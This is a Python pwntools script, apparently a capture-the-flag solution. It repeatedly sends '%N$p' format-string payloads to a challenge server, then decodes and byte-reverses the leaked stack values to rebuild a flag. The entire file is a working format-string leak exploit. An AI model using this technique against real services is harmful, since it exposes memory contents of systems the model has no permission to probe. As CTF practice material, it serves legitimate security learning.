from pwn import *

flag = ''

for i in range(100):
    conn = remote("chals1.apoorvctf.xyz", 3003)
    try:
        # Format the counter
        conn.recvline()
        conn.recvline()
        payload = '%{}$p'.format(i).encode()
        print(payload)
        conn.sendline(payload)
        conn.recvline()
        result = conn.recvline()
        if not b'nil' in result:
            print(str(i) + ': ' + str(result))
            try:
                # Decode, reverse endianess and print
                decoded = unhex(result.strip().decode()[2:])
                reversed_hex = decoded[::-1]
                print(str(reversed_hex))
                # Build up flag
                flag += reversed_hex.decode()
            except BaseException:
                pass
    except EOFError:
        pass

info(flag)
conn.close()
